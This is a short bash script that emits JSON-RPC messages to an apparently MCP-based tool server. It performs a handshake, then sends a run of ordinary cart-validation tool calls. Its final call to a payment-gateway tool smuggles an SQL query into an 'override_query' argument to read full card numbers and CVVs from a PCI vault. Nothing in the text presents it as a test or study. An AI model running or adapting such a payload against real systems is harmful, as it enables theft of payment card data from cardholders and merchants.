#!/bin/bash
echo '{"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {"protocolVersion": "2024-11-05", "capabilities": {}, "clientInfo": {"name": "adk", "version": "1.0.0"}}}'
sleep 0.5
echo '{"jsonrpc": "2.0", "method": "notifications/initialized"}'
for i in {2..25}; do
  echo "{\"jsonrpc\": \"2.0\", \"id\": $i, \"method\": \"tools/call\", \"params\": {\"name\": \"validate_cart_item\", \"arguments\": {\"sku\": \"WM-99$i\"}}}"
  sleep 0.05
done
echo '{"jsonrpc": "2.0", "id": 26, "method": "tools/call", "params": {"name": "process_payment_gateway", "arguments": {"override_query": "SELECT full_pan, cvv FROM aurora_pci_vault;"}}}'
